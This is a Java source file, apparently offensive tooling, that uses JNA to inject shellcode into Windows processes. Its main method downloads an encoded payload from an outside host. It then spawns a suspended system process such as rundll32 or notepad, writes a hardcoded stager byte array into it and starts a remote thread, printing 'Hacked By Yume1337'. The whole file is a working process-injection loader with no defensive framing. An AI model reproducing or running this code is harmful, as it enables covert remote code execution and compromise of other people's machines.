package asexploits;

import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.Random;

public class ShellcodeLoader {
    static Kernel32 kernel32;
    static IKernel32 iKernel32;
    public static String[] ProcessArrayx32 = {"C:\\Windows\\SysWOW64\\ARP.exe", "C:\\Windows\\SysWOW64\\at.exe", "C:\\Windows\\SysWOW64\\auditpol.exe", "C:\\Windows\\SysWOW64\\bitsadmin.exe", "C:\\Windows\\SysWOW64\\bootcfg.exe", "C:\\Windows\\SysWOW64\\ByteCodeGenerator.exe", "C:\\Windows\\SysWOW64\\cacls.exe", "C:\\Windows\\SysWOW64\\chcp.com", "C:\\Windows\\SysWOW64\\CheckNetIsolation.exe", "C:\\Windows\\SysWOW64\\chkdsk.exe", "C:\\Windows\\SysWOW64\\choice.exe", "C:\\Windows\\SysWOW64\\cmdkey.exe", "C:\\Windows\\SysWOW64\\comp.exe", "C:\\Windows\\SysWOW64\\diskcomp.com", "C:\\Windows\\SysWOW64\\Dism.exe", "C:\\Windows\\SysWOW64\\esentutl.exe", "C:\\Windows\\SysWOW64\\expand.exe", "C:\\Windows\\SysWOW64\\fc.exe", "C:\\Windows\\SysWOW64\\find.exe", "C:\\Windows\\SysWOW64\\gpresult.exe"};
    public static String[] ProcessArrayx64 = {"C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\find.exe", "C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\System32\\ARP.EXE"};

    public static String shellcode = "";

    public static String getHTML(String urlToRead) throws Exception {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlToRead);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("user-agent",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36");
        conn.setRequestProperty("xf-api-key", "LnM-qSeQqtJlJmJnVt76GhU-SoiolWs9");
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()))) {
            for (String line; (line = reader.readLine()) != null; ) {
                result.append(line);
            }
        }
        return result.toString();
    }

    static {
        kernel32 = (Kernel32) Native.loadLibrary(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
        iKernel32 = (IKernel32) Native.loadLibrary("kernel32", IKernel32.class);
    }

    public static String encode(String content) {
        String encodedString = Base64.getEncoder().encodeToString(content.getBytes());
        return encodedString;
    }
    public static String decode(String content) {
        byte[] decodedBytes = Base64.getDecoder().decode(content);
        String decodedString = new String(decodedBytes);
        return decodedString;
    }

    public static void main(String[] args) throws Exception {
        shellcode = getHTML("https://yumegod.com/shell.txt");
        ShellcodeLoader jnaLoader = new ShellcodeLoader();
        jnaLoader.loadShellCode(decode(shellcode), false);
    }

    public void loadShellCode(String shellcodeHex, boolean is64) {

        String[] targetProcessArray = null;
        // java是64位且选择注入64位shellcode
        if (System.getProperty("sun.arch.data.model").equals("64") && is64) {
            targetProcessArray = ProcessArrayx64;
        } else { //默认注入32位进程
            targetProcessArray = ProcessArrayx32;
        }
        int j = targetProcessArray.length;
        byte b = 0;
        Random random = new Random();
        int k = b + random.nextInt(j);
        String targetProcess = targetProcessArray[k];
        this.loadShellCode(shellcodeHex, targetProcess);

    }

    public void loadShellCode(String shellcodeHex, String targetProcess) {
        byte shellcode[] = new byte[] {(byte) 0xfc, (byte) 0xe8, (byte) 0x89, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x60, (byte) 0x89, (byte) 0xe5, (byte) 0x31, (byte) 0xd2, (byte) 0x64, (byte) 0x8b, (byte) 0x52, (byte) 0x30, (byte) 0x8b, (byte) 0x52, (byte) 0x0c, (byte) 0x8b, (byte) 0x52, (byte) 0x14, (byte) 0x8b, (byte) 0x72, (byte) 0x28, (byte) 0x0f, (byte) 0xb7, (byte) 0x4a, (byte) 0x26, (byte) 0x31, (byte) 0xff, (byte) 0x31, (byte) 0xc0, (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0xc1, (byte) 0xcf, (byte) 0x0d, (byte) 0x01, (byte) 0xc7, (byte) 0xe2, (byte) 0xf0, (byte) 0x52, (byte) 0x57, (byte) 0x8b, (byte) 0x52, (byte) 0x10, (byte) 0x8b, (byte) 0x42, (byte) 0x3c, (byte) 0x01, (byte) 0xd0, (byte) 0x8b, (byte) 0x40, (byte) 0x78, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x4a, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x8b, (byte) 0x58, (byte) 0x20, (byte) 0x01, (byte) 0xd3, (byte) 0xe3, (byte) 0x3c, (byte) 0x49, (byte) 0x8b, (byte) 0x34, (byte) 0x8b, (byte) 0x01, (byte) 0xd6, (byte) 0x31, (byte) 0xff, (byte) 0x31, (byte) 0xc0, (byte) 0xac, (byte) 0xc1, (byte) 0xcf, (byte) 0x0d, (byte) 0x01, (byte) 0xc7, (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf4, (byte) 0x03, (byte) 0x7d, (byte) 0xf8, (byte) 0x3b, (byte) 0x7d, (byte) 0x24, (byte) 0x75, (byte) 0xe2, (byte) 0x58, (byte) 0x8b, (byte) 0x58, (byte) 0x24, (byte) 0x01, (byte) 0xd3, (byte) 0x66, (byte) 0x8b, (byte) 0x0c, (byte) 0x4b, (byte) 0x8b, (byte) 0x58, (byte) 0x1c, (byte) 0x01, (byte) 0xd3, (byte) 0x8b, (byte) 0x04, (byte) 0x8b, (byte) 0x01, (byte) 0xd0, (byte) 0x89, (byte) 0x44, (byte) 0x24, (byte) 0x24, (byte) 0x5b, (byte) 0x5b, (byte) 0x61, (byte) 0x59, (byte) 0x5a, (byte) 0x51, (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x5f, (byte) 0x5a, (byte) 0x8b, (byte) 0x12, (byte) 0xeb, (byte) 0x86, (byte) 0x5d, (byte) 0x68, (byte) 0x6e, (byte) 0x65, (byte) 0x74, (byte) 0x00, (byte) 0x68, (byte) 0x77, (byte) 0x69, (byte) 0x6e, (byte) 0x69, (byte) 0x54, (byte) 0x68, (byte) 0x4c, (byte) 0x77, (byte) 0x26, (byte) 0x07, (byte) 0xff, (byte) 0xd5, (byte) 0x31, (byte) 0xff, (byte) 0x57, (byte) 0x57, (byte) 0x57, (byte) 0x57, (byte) 0x57, (byte) 0x68, (byte) 0x3a, (byte) 0x56, (byte) 0x79, (byte) 0xa7, (byte) 0xff, (byte) 0xd5, (byte) 0xe9, (byte) 0x84, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x5b, (byte) 0x31, (byte) 0xc9, (byte) 0x51, (byte) 0x51, (byte) 0x6a, (byte) 0x03, (byte) 0x51, (byte) 0x51, (byte) 0x68, (byte) 0x39, (byte) 0x05, (byte) 0x00, (byte) 0x00, (byte) 0x53, (byte) 0x50, (byte) 0x68, (byte) 0x57, (byte) 0x89, (byte) 0x9f, (byte) 0xc6, (byte) 0xff, (byte) 0xd5, (byte) 0xeb, (byte) 0x70, (byte) 0x5b, (byte) 0x31, (byte) 0xd2, (byte) 0x52, (byte) 0x68, (byte) 0x00, (byte) 0x02, (byte) 0x40, (byte) 0x84, (byte) 0x52, (byte) 0x52, (byte) 0x52, (byte) 0x53, (byte) 0x52, (byte) 0x50, (byte) 0x68, (byte) 0xeb, (byte) 0x55, (byte) 0x2e, (byte) 0x3b, (byte) 0xff, (byte) 0xd5, (byte) 0x89, (byte) 0xc6, (byte) 0x83, (byte) 0xc3, (byte) 0x50, (byte) 0x31, (byte) 0xff, (byte) 0x57, (byte) 0x57, (byte) 0x6a, (byte) 0xff, (byte) 0x53, (byte) 0x56, (byte) 0x68, (byte) 0x2d, (byte) 0x06, (byte) 0x18, (byte) 0x7b, (byte) 0xff, (byte) 0xd5, (byte) 0x85, (byte) 0xc0, (byte) 0x0f, (byte) 0x84, (byte) 0xc3, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x31, (byte) 0xff, (byte) 0x85, (byte) 0xf6, (byte) 0x74, (byte) 0x04, (byte) 0x89, (byte) 0xf9, (byte) 0xeb, (byte) 0x09, (byte) 0x68, (byte) 0xaa, (byte) 0xc5, (byte) 0xe2, (byte) 0x5d, (byte) 0xff, (byte) 0xd5, (byte) 0x89, (byte) 0xc1, (byte) 0x68, (byte) 0x45, (byte) 0x21, (byte) 0x5e, (byte) 0x31, (byte) 0xff, (byte) 0xd5, (byte) 0x31, (byte) 0xff, (byte) 0x57, (byte) 0x6a, (byte) 0x07, (byte) 0x51, (byte) 0x56, (byte) 0x50, (byte) 0x68, (byte) 0xb7, (byte) 0x57, (byte) 0xe0, (byte) 0x0b, (byte) 0xff, (byte) 0xd5, (byte) 0xbf, (byte) 0x00, (byte) 0x2f, (byte) 0x00, (byte) 0x00, (byte) 0x39, (byte) 0xc7, (byte) 0x74, (byte) 0xb7, (byte) 0x31, (byte) 0xff, (byte) 0xe9, (byte) 0x91, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0xe9, (byte) 0xc9, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0xe8, (byte) 0x8b, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0x59, (byte) 0x75, (byte) 0x6d, (byte) 0x65, (byte) 0x43, (byte) 0x6c, (byte) 0x6f, (byte) 0x75, (byte) 0x64, (byte) 0x5f, (byte) 0x53, (byte) 0x6f, (byte) 0x63, (byte) 0x6b, (byte) 0x65, (byte) 0x74, (byte) 0x48, (byte) 0x61, (byte) 0x6e, (byte) 0x64, (byte) 0x6c, (byte) 0x65, (byte) 0x72, (byte) 0x2e, (byte) 0x70, (byte) 0x68, (byte) 0x70, (byte) 0x00, (byte) 0x35, (byte) 0x4f, (byte) 0x21, (byte) 0x50, (byte) 0x25, (byte) 0x40, (byte) 0x41, (byte) 0x50, (byte) 0x5b, (byte) 0x34, (byte) 0x5c, (byte) 0x50, (byte) 0x5a, (byte) 0x58, (byte) 0x35, (byte) 0x34, (byte) 0x28, (byte) 0x50, (byte) 0x5e, (byte) 0x29, (byte) 0x37, (byte) 0x43, (byte) 0x43, (byte) 0x29, (byte) 0x37, (byte) 0x7d, (byte) 0x24, (byte) 0x45, (byte) 0x49, (byte) 0x43, (byte) 0x41, (byte) 0x52, (byte) 0x2d, (byte) 0x53, (byte) 0x54, (byte) 0x41, (byte) 0x4e, (byte) 0x44, (byte) 0x41, (byte) 0x52, (byte) 0x44, (byte) 0x2d, (byte) 0x41, (byte) 0x4e, (byte) 0x54, (byte) 0x49, (byte) 0x56, (byte) 0x49, (byte) 0x52, (byte) 0x55, (byte) 0x53, (byte) 0x00, (byte) 0x55, (byte) 0x73, (byte) 0x65, (byte) 0x72, (byte) 0x2d, (byte) 0x41, (byte) 0x67, (byte) 0x65, (byte) 0x6e, (byte) 0x74, (byte) 0x3a, (byte) 0x20, (byte) 0x4d, (byte) 0x6f, (byte) 0x7a, (byte) 0x69, (byte) 0x6c, (byte) 0x6c, (byte) 0x61, (byte) 0x2f, (byte) 0x34, (byte) 0x2e, (byte) 0x30, (byte) 0x20, (byte) 0x28, (byte) 0x63, (byte) 0x6f, (byte) 0x6d, (byte) 0x70, (byte) 0x61, (byte) 0x74, (byte) 0x69, (byte) 0x62, (byte) 0x6c, (byte) 0x65, (byte) 0x3b, (byte) 0x20, (byte) 0x4d, (byte) 0x53, (byte) 0x49, (byte) 0x45, (byte) 0x20, (byte) 0x37, (byte) 0x2e, (byte) 0x30, (byte) 0x3b, (byte) 0x20, (byte) 0x57, (byte) 0x69, (byte) 0x6e, (byte) 0x64, (byte) 0x6f, (byte) 0x77, (byte) 0x73, (byte) 0x20, (byte) 0x4e, (byte) 0x54, (byte) 0x20, (byte) 0x35, (byte) 0x2e, (byte) 0x31, (byte) 0x3b, (byte) 0x20, (byte) 0x53, (byte) 0x56, (byte) 0x31, (byte) 0x29, (byte) 0x0d, (byte) 0x0a, (byte) 0x00, (byte) 0x35, (byte) 0x4f, (byte) 0x21, (byte) 0x50, (byte) 0x25, (byte) 0x40, (byte) 0x41, (byte) 0x50, (byte) 0x5b, (byte) 0x34, (byte) 0x5c, (byte) 0x50, (byte) 0x5a, (byte) 0x58, (byte) 0x35, (byte) 0x34, (byte) 0x28, (byte) 0x50, (byte) 0x5e, (byte) 0x29, (byte) 0x37, (byte) 0x43, (byte) 0x43, (byte) 0x29, (byte) 0x37, (byte) 0x7d, (byte) 0x24, (byte) 0x45, (byte) 0x49, (byte) 0x43, (byte) 0x41, (byte) 0x52, (byte) 0x2d, (byte) 0x53, (byte) 0x54, (byte) 0x41, (byte) 0x4e, (byte) 0x44, (byte) 0x41, (byte) 0x52, (byte) 0x44, (byte) 0x2d, (byte) 0x41, (byte) 0x4e, (byte) 0x54, (byte) 0x49, (byte) 0x56, (byte) 0x49, (byte) 0x52, (byte) 0x55, (byte) 0x53, (byte) 0x2d, (byte) 0x54, (byte) 0x45, (byte) 0x53, (byte) 0x54, (byte) 0x2d, (byte) 0x46, (byte) 0x49, (byte) 0x4c, (byte) 0x45, (byte) 0x21, (byte) 0x24, (byte) 0x48, (byte) 0x2b, (byte) 0x48, (byte) 0x2a, (byte) 0x00, (byte) 0x35, (byte) 0x4f, (byte) 0x21, (byte) 0x50, (byte) 0x25, (byte) 0x40, (byte) 0x41, (byte) 0x50, (byte) 0x5b, (byte) 0x34, (byte) 0x5c, (byte) 0x50, (byte) 0x5a, (byte) 0x58, (byte) 0x35, (byte) 0x34, (byte) 0x28, (byte) 0x50, (byte) 0x5e, (byte) 0x29, (byte) 0x37, (byte) 0x43, (byte) 0x43, (byte) 0x29, (byte) 0x37, (byte) 0x7d, (byte) 0x24, (byte) 0x45, (byte) 0x49, (byte) 0x43, (byte) 0x41, (byte) 0x52, (byte) 0x2d, (byte) 0x53, (byte) 0x54, (byte) 0x41, (byte) 0x4e, (byte) 0x44, (byte) 0x41, (byte) 0x52, (byte) 0x44, (byte) 0x2d, (byte) 0x41, (byte) 0x4e, (byte) 0x54, (byte) 0x49, (byte) 0x56, (byte) 0x49, (byte) 0x52, (byte) 0x55, (byte) 0x53, (byte) 0x2d, (byte) 0x54, (byte) 0x45, (byte) 0x53, (byte) 0x54, (byte) 0x2d, (byte) 0x46, (byte) 0x49, (byte) 0x4c, (byte) 0x45, (byte) 0x21, (byte) 0x24, (byte) 0x48, (byte) 0x2b, (byte) 0x48, (byte) 0x2a, (byte) 0x00, (byte) 0x35, (byte) 0x4f, (byte) 0x21, (byte) 0x50, (byte) 0x25, (byte) 0x40, (byte) 0x41, (byte) 0x50, (byte) 0x5b, (byte) 0x34, (byte) 0x5c, (byte) 0x50, (byte) 0x5a, (byte) 0x58, (byte) 0x35, (byte) 0x34, (byte) 0x28, (byte) 0x50, (byte) 0x5e, (byte) 0x29, (byte) 0x37, (byte) 0x43, (byte) 0x43, (byte) 0x29, (byte) 0x37, (byte) 0x7d, (byte) 0x24, (byte) 0x45, (byte) 0x49, (byte) 0x43, (byte) 0x41, (byte) 0x52, (byte) 0x2d, (byte) 0x53, (byte) 0x54, (byte) 0x41, (byte) 0x4e, (byte) 0x44, (byte) 0x41, (byte) 0x52, (byte) 0x44, (byte) 0x2d, (byte) 0x41, (byte) 0x4e, (byte) 0x54, (byte) 0x49, (byte) 0x56, (byte) 0x49, (byte) 0x52, (byte) 0x55, (byte) 0x53, (byte) 0x2d, (byte) 0x54, (byte) 0x45, (byte) 0x53, (byte) 0x54, (byte) 0x2d, (byte) 0x46, (byte) 0x49, (byte) 0x4c, (byte) 0x45, (byte) 0x21, (byte) 0x24, (byte) 0x48, (byte) 0x2b, (byte) 0x48, (byte) 0x2a, (byte) 0x00, (byte) 0x35, (byte) 0x4f, (byte) 0x21, (byte) 0x50, (byte) 0x25, (byte) 0x40, (byte) 0x41, (byte) 0x50, (byte) 0x5b, (byte) 0x34, (byte) 0x5c, (byte) 0x50, (byte) 0x5a, (byte) 0x58, (byte) 0x35, (byte) 0x34, (byte) 0x28, (byte) 0x50, (byte) 0x5e, (byte) 0x29, (byte) 0x37, (byte) 0x43, (byte) 0x43, (byte) 0x29, (byte) 0x37, (byte) 0x7d, (byte) 0x24, (byte) 0x45, (byte) 0x49, (byte) 0x00, (byte) 0x68, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2, (byte) 0x56, (byte) 0xff, (byte) 0xd5, (byte) 0x6a, (byte) 0x40, (byte) 0x68, (byte) 0x00, (byte) 0x10, (byte) 0x00, (byte) 0x00, (byte) 0x68, (byte) 0x00, (byte) 0x00, (byte) 0x40, (byte) 0x00, (byte) 0x57, (byte) 0x68, (byte) 0x58, (byte) 0xa4, (byte) 0x53, (byte) 0xe5, (byte) 0xff, (byte) 0xd5, (byte) 0x93, (byte) 0xb9, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x01, (byte) 0xd9, (byte) 0x51, (byte) 0x53, (byte) 0x89, (byte) 0xe7, (byte) 0x57, (byte) 0x68, (byte) 0x00, (byte) 0x20, (byte) 0x00, (byte) 0x00, (byte) 0x53, (byte) 0x56, (byte) 0x68, (byte) 0x12, (byte) 0x96, (byte) 0x89, (byte) 0xe2, (byte) 0xff, (byte) 0xd5, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0xc6, (byte) 0x8b, (byte) 0x07, (byte) 0x01, (byte) 0xc3, (byte) 0x85, (byte) 0xc0, (byte) 0x75, (byte) 0xe5, (byte) 0x58, (byte) 0xc3, (byte) 0xe8, (byte) 0xa9, (byte) 0xfd, (byte) 0xff, (byte) 0xff, (byte) 0x36, (byte) 0x34, (byte) 0x2e, (byte) 0x31, (byte) 0x31, (byte) 0x32, (byte) 0x2e, (byte) 0x34, (byte) 0x33, (byte) 0x2e, (byte) 0x32, (byte) 0x32, (byte) 0x31, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00};

        int shellcodeSize = shellcode.length;
        IntByReference intByReference = new IntByReference(0);
        Memory memory = new Memory((long) shellcodeSize);

        System.out.println("Hacked By Yume1337");
        System.out.println("Injected into Process: " + targetProcess);

        for (int j = 0; j < shellcodeSize; ++j) {
            memory.setByte((long) j, shellcode[j]);
        }

        WinBase.PROCESS_INFORMATION pROCESS_INFORMATION = new WinBase.PROCESS_INFORMATION();
        WinBase.STARTUPINFO sTARTUPINFO = new WinBase.STARTUPINFO();
        sTARTUPINFO.cb = new WinDef.DWORD((long) pROCESS_INFORMATION.size());
        if (kernel32.CreateProcess(targetProcess, (String) null, (WinBase.SECURITY_ATTRIBUTES) null, (WinBase.SECURITY_ATTRIBUTES) null, false, new WinDef.DWORD(4L), (Pointer) null, (String) null, sTARTUPINFO, pROCESS_INFORMATION)) {
            Pointer pointer = iKernel32.VirtualAllocEx(pROCESS_INFORMATION.hProcess, Pointer.createConstant(0), shellcodeSize, 4096, 64);
            iKernel32.WriteProcessMemory(pROCESS_INFORMATION.hProcess, pointer, memory, shellcodeSize, intByReference);
            HANDLE hANDLE = iKernel32.CreateRemoteThread(pROCESS_INFORMATION.hProcess, (Object) null, 0, pointer, 0, 0, (Object) null);
            kernel32.WaitForSingleObject(hANDLE, -1);
        }
    }


    public static byte[] hexStrToByteArray(String str) {
        if (str == null) {
            return null;
        } else if (str.length() == 0) {
            return new byte[0];
        } else {
            byte[] byteArray = new byte[str.length() / 2];

            for (int i = 0; i < byteArray.length; ++i) {
                String subStr = str.substring(2 * i, 2 * i + 2);
                byteArray[i] = (byte) Integer.parseInt(subStr, 16);
            }

            return byteArray;
        }
    }

    interface IKernel32 extends StdCallLibrary {
        Pointer VirtualAlloc(Pointer var1, int var2, int var3, int var4);

        HANDLE CreateThread(Object var1, int var2, Pointer var3, int var4, int var5, Object var6);

        Pointer VirtualAllocEx(HANDLE var1, Pointer var2, int var3, int var4, int var5);

        HANDLE CreateRemoteThread(HANDLE var1, Object var2, int var3, Pointer var4, int var5, int var6, Object var7);

        boolean WriteProcessMemory(WinNT.HANDLE param1HANDLE, Pointer param1Pointer1, Pointer param1Pointer2, int param1Int, IntByReference param1IntByReference);

        boolean ReadProcessMemory(Pointer var1, int var2, Pointer var3, int var4, IntByReference var5);

        int VirtualQueryEx(Pointer var1, Pointer var2, Pointer var3, int var4);

        Pointer OpenProcess(int var1, boolean var2, int var3);

        Pointer GetCurrentProcess();
    }
}
